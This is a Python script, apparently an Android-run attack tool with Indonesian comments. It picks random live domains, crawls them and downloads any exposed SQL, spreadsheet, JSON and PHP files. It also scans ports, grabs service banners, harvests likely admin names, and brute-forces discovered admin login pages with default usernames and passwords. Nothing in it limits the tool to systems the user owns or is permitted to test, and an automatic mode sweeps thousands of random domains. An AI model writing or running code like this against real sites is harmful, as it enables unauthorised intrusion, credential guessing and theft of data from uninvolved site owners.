import os
import random
import socket
import string
import requests
import re

from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

DOWNLOAD_ROOT      = "/sdcard/Download"
USER_AGENT         = "Mozilla/5.0 (grab-engine/vera)"
MAX_PAGES          = 100
COMMON_PORTS       = [21, 22, 80, 443, 8080, 8443, 3306]
COMMON_ADMIN_PATHS = [
    "/admin", "/administrator", "/login", "/user/login",
    "/wp-admin", "/cms", "/manage", "/admin.php"
]
WP_JSON_PATHS      = ["/wp-json/", "/wp-json/wp/v2/posts"]
TLD_LIST           = [".com", ".net", ".org", ".id"]

VOWELS     = "aeiou"
CONSONANTS = "".join(set(string.ascii_lowercase) - set(VOWELS))

def gen_pronounceable_name(length=6):
    name = []
    for i in range(length):
        pool = VOWELS if i % 2 else CONSONANTS
        name.append(random.choice(pool))
    return "".join(name)

def gen_random_domain():
    name   = gen_pronounceable_name(random.randint(5, 8))
    suffix = random.choice(TLD_LIST)
    return name + suffix

def is_domain_resolvable(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except socket.gaierror:
        return False

def extract_links(html, base_url):
    soup, links = BeautifulSoup(html or "", "html.parser"), set()
    for tag, attr in [("a","href"),("script","src"),("link","href"),("img","src")]:
        for elem in soup.find_all(tag, **{attr: True}):
            links.add(urljoin(base_url, elem[attr]))
    for match in re.findall(
        r"['\"](https?://[^'\" ]+\.(?:sql|xlsx|json|php))['\"]",
        html or "", re.IGNORECASE
    ):
        links.add(match)
    return links

def analyze_links(links):
    sqls, xlsxs, admins, jsons, phps = set(), set(), set(), set(), set()
    for link in links:
        low = link.lower()
        if low.endswith(".sql"):    sqls.add(link)
        if low.endswith(".xlsx"):   xlsxs.add(link)
        if low.endswith(".json") or "/wp-json" in low:
            jsons.add(link)
        if low.endswith(".php"):    phps.add(link)
        path = urlparse(link).path.lower()
        if any(p in path for p in COMMON_ADMIN_PATHS):
            admins.add(link)
    return sqls, xlsxs, admins, jsons, phps


def random_crawl(start_url):
    domain    = urlparse(start_url).netloc
    visited, to_visit, all_links = set(), [start_url], set()
    headers = {"User-Agent": USER_AGENT}

    while to_visit and len(visited) < MAX_PAGES:
        url = to_visit.pop(0)
        if url in visited:
            continue
        try:
            resp      = requests.get(url, headers=headers, timeout=5)
            resp.raise_for_status()
            new_links = extract_links(resp.text, start_url)
            all_links |= new_links
            for l in new_links:
                if urlparse(l).netloc == domain and l not in visited:
                    to_visit.append(l)
        except:
            pass
        visited.add(url)

    return all_links

def scan_admin_paths(start_url):
    headers, found = {"User-Agent": USER_AGENT}, set()
    for path in COMMON_ADMIN_PATHS + WP_JSON_PATHS:
        u = urljoin(start_url, path)
        try:
            if requests.head(u, headers=headers, timeout=3).status_code < 400:
                found.add(u)
        except:
            pass
    return found

def scan_open_ports(host):
    open_ports = set()
    for port in COMMON_PORTS:
        try:
            sock = socket.socket()
            sock.settimeout(0.3)
            if sock.connect_ex((host, port)) == 0:
                open_ports.add(port)
            sock.close()
        except:
            pass
    return open_ports


def nmap_like_scan(host, ports=range(1, 101)):
    """
    Scan mirip nmap: cek port + banner grab (service info).
    Sekalian coba ambil "nama admin" dari banner / halaman.
    """
    results = {}
    possible_admins = set()

    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            if sock.connect_ex((host, port)) == 0:
                banner = ""
                try:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode(errors="ignore").strip()
                except:
                    pass
                banner = banner or "Open (no banner)"
                results[port] = banner

                # --- coba ambil admin hint ---
                if port in (21, 22):  # FTP / SSH
                    m = re.search(r"(admin[\w-]*)", banner, re.I)
                    if m: possible_admins.add(m.group(1))
                if port == 3306:  # MySQL
                    m = re.search(r"user\s*=\s*([\w-]+)", banner, re.I)
                    if m: possible_admins.add(m.group(1))
                if port in (80, 443):  # HTTP/HTTPS
                    try:
                        url = f"http://{host}" if port == 80 else f"https://{host}"
                        r = requests.get(url, timeout=5, headers={"User-Agent": USER_AGENT})
                        title = re.search(r"<title>(.*?)</title>", r.text, re.I)
                        author = re.search(r'name=["\']author["\'] content=["\']([^"\']+)["\']', r.text, re.I)
                        if author:
                            possible_admins.add(author.group(1))
                        elif title and "admin" in title.group(1).lower():
                            possible_admins.add(title.group(1).strip())
                    except:
                        pass

            sock.close()
        except:
            pass

    return results, possible_admins


def hydra_like_attack(url, usernames=None, passwords=None,
                      method="post", user_field="username", pass_field="password"):
    if usernames is None:
        usernames = ["admin", "root", "user"]
    if passwords is None:
        passwords = ["1234", "admin", "password", "root"]

    headers = {"User-Agent": USER_AGENT}
    success = []

    print(f"\n🔐 Hydra-like brute force on {url} ...")
    print(f"   Users={len(usernames)}, Passwords={len(passwords)}")

    try:
        baseline = requests.get(url, headers=headers, timeout=5).text
        baseline_len = len(baseline)
    except:
        baseline_len = 0

    for u in usernames:
        for p in passwords:
            try:
                if method == "basic":
                    r = requests.get(url, auth=(u, p), headers=headers, timeout=5, allow_redirects=False)
                else:
                    data = {user_field: u, pass_field: p}
                    r = requests.post(url, data=data, headers=headers, timeout=5, allow_redirects=False)

                body = r.text.lower()
                diff_len = abs(len(r.text) - baseline_len)

                if (
                    r.status_code in (302, 303)
                    or ("set-cookie" in r.headers and "session" in r.headers.get("set-cookie", "").lower())
                    or (r.status_code == 200 and diff_len > 50
                        and not re.search(r"(login|error|failed|invalid|incorrect)", body, re.I))
                ):
                    print(f"✅ Found login → {u}:{p}")
                    success.append((u, p))
            except Exception:
                pass

    if not success:
        print("❌ No valid credentials found")
    return success

def download_file(url, folder):
    os.makedirs(folder, exist_ok=True)
    name = os.path.basename(urlparse(url).path) or "file"
    dest = os.path.join(folder, name)
    try:
        r = requests.get(url, stream=True, timeout=10)
        r.raise_for_status()
        with open(dest, "wb") as f:
            for chunk in r.iter_content(1024):
                f.write(chunk)
        print(f"✅ Downloaded: {url}")
    except Exception as e:
        print(f"❌ Failed download {url}: {e}")

def save_json(json_url, folder):
    os.makedirs(folder, exist_ok=True)
    name = os.path.basename(urlparse(json_url).path) or "data.json"
    dest = os.path.join(folder, name)
    try:
        r = requests.get(json_url, timeout=10)
        r.raise_for_status()
        with open(dest, "wb") as f:
            f.write(r.content)
        print(f"✅ Saved JSON: {json_url}")
    except Exception as e:
        print(f"❌ JSON save failed {json_url}: {e}")

def export_links_txt(links, folder):
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, "found_links.txt")
    with open(path, "w", encoding="utf-8") as f:
        for link in sorted(links):
            f.write(link + "\n")
    print(f"📝 Links list → {path}")

def web_scan(start_url):
    parsed     = urlparse(start_url)
    domain_dir = parsed.netloc.replace(".", "_")
    out_dir    = os.path.join(DOWNLOAD_ROOT, domain_dir)
    os.makedirs(out_dir, exist_ok=True)

    print(f"🔮 Scanning {start_url} ...")
    links                   = random_crawl(start_url)
    sqls, xlsxs, admins, jsons, phps = analyze_links(links)
    admins |= scan_admin_paths(start_url)
    ports  = scan_open_ports(parsed.hostname or "")

    # Download resources
    for s in sqls:
        print(f"\n📂 Downloading (SQL) → {s}")
        download_file(s, out_dir)
    for x in xlsxs:
        print(f"\n📂 Downloading (XLSX) → {x}")
        download_file(x, out_dir)
    for j in jsons:
        print(f"\n📂 Downloading (JSON) → {j}")
        save_json(j, out_dir)
    for p in phps:
        print(f"\n📂 Downloading (PHP) → {p}")
        download_file(p, out_dir)

    export_links_txt(links, out_dir)

    # Nmap-like Scan
    print("\n🔍 Running Nmap-like scan (top 100 ports)...")
    nmap_results, nmap_admins = nmap_like_scan(parsed.hostname, range(1, 101))
    if nmap_results:
        for port, banner in nmap_results.items():
            print(f"  {port}/tcp → {banner[:60]}")
    else:
        print("  No open ports found in range 1–100")

    # Hydra-like on admin panels
    if admins:
        for adm in admins:
            hydra_like_attack(adm)

    # Summary
    print("\n=== SCAN SUMMARY ===")
    print(f"🌐 Domain : {parsed.netloc}")
    print(f"🔑 Admin  : {', '.join(admins) if admins else 'None'}")
    print(f"🔌 Ports  : {', '.join(map(str, ports)) if ports else 'None'}")
    print(f"👤 Admin Name : {', '.join(nmap_admins) if nmap_admins else 'Unknown'}")
    print(f"📊 Files  : {len(sqls)} SQL, {len(xlsxs)} XLSX, {len(jsons)} JSON, {len(phps)} PHP")
    print(f"📁 Output : {out_dir}")
    print("====================\n")

    return {
        "domain": parsed.netloc,
        "resources": {
            "sql": sqls, "xlsx": xlsxs,
            "json": jsons, "php": phps,
            "admin": admins, "ports": sorted(ports),
            "nmap": nmap_results,
            "nmap_admins": nmap_admins
        }
    }

def auto_random_scan(max_attempts=100):
    headers = {"User-Agent": USER_AGENT}

    for i in range(1, max_attempts + 1):
        domain = gen_random_domain()
        if not is_domain_resolvable(domain):
            continue

        url = f"http://{domain}"
        print(f"[{i}/{max_attempts}] Testing {url} ...", end=" ")
        try:
            r = requests.head(url, headers=headers, timeout=2)
            if r.status_code < 400:
                print("Alive!")
                result = web_scan(url)
                if (result["resources"]["sql"]
                    or result["resources"]["xlsx"]
                    or result["resources"]["json"]
                    or result["resources"]["php"]):
                    return
            else:
                print("No HTTP response")
        except:
            print("Failed")
    print(f"❌ No domain with data found after {max_attempts} tries.")

def _extract_url(raw):
    if isinstance(raw, str) and raw.startswith("http"):
        return raw
    if isinstance(raw, (list, tuple)):
        for t in raw:
            if isinstance(t, str) and t.startswith("http"):
                return t
    return None

def handle_scan(raw_args):
    url = _extract_url(raw_args)
    if not url:
        print("❌ Provide a valid URL.")
        return
    web_scan(url)

def handle_auto(raw_args):
    auto_random_scan(max_attempts=10000)